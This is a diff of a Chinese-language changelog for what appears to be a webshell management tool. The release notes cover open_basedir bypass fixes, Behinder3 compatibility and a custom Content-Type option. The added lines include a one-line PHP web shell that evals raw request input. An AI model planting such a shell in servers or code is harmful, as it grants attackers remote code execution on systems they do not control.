@@ -7,6 +7,21 @@
 ### 核心
 
 * 修复 PHP/PHP4 当前目录不可写时 bypass open_basedir 失败的 Bug
+* 新增 PHPRAW 类型, 该类型 webshell 支持的 WebShell 类似如下代码:
+
+```php
+<?php eval(file_get_contents("php://input"));>
+```
+
+> 为了方便直连 Behinder3 WebShell, 编码器已内置
+
+### 数据管理
+
+* 优化了编辑 Shell 信息时，URL后缀发生改变后连动修改「连接类型」功能
+
+### 后端模块
+
+* 支持自定义 Content-Type, 默认是 `form`
 
 ## 2021/07/25 `v(2.1.14)`
 
